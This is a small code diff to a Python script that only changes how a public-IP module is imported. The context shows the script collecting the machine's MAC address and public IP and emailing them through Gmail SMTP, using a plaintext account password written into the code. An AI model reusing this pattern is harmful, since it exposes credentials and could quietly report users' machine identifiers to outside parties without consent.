@@ -1,6 +1,6 @@
 import smtplib
 import getmac
-from publicip import get as getip
+import publicip
 
 smtp = smtplib.SMTP('smtp.gmail.com', 587)
 smtp.starttls()
@@ -8,7 +8,7 @@ smtp.starttls()
 smtp.login('testesrt123@gmail.com', 'Suporte@123')
 
 mac = str(getmac.get_mac_address())
-ip = getip()
+ip = publicip.get()
 de = 'testesrt123@gmail.com'
 para = ['mrcutrim@gmail.com']
 msg = """From: %s
